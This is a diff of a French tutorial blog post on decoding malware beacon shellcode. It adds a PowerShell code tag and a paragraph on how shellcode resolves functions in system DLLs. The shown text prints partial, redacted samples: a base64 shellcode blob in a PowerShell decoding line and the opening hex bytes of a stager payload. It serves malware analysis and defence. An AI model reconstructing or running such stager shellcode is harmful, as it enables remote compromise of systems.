@@ -109,7 +109,7 @@ Ce script est très utilisée notamment par les malwares afin d'envoyer un beaco
 
 Une autre manière d'obtenir notre shellcode est d'exécuter la commande dans un terminale ISE :
 
-```
+```powershell
 [Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs[REDACTED]')
 
 for ($x = 0; $x -lt $var_code.Count; $x++) {
@@ -132,3 +132,7 @@ fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 [REDACTED]
 Pour comprendre ce que fait notre shellcode, nous pouvons le désassembler avec shellen (https://github.com/merrychap/shellen).
 
 ![dsm_shellcode1.PNG](/img/decode-shellcode/dsm_shellcode1.PNG)
+
+Les DLLs système occupent toujours la même adresse en mémoire. De cette manière, connaissant leurs emplacements, les shellcodes appellent directement les fonctions qui les interessent en chargeant dynamiquement les fonctions voulues. Il est alors facile de repérer certains patterns. Votre bible à cet instant, c'est la doc Microsoft !
+
+![dsm_internet.PNG](/img/decode-shellcode/dsm_internet.PNG)
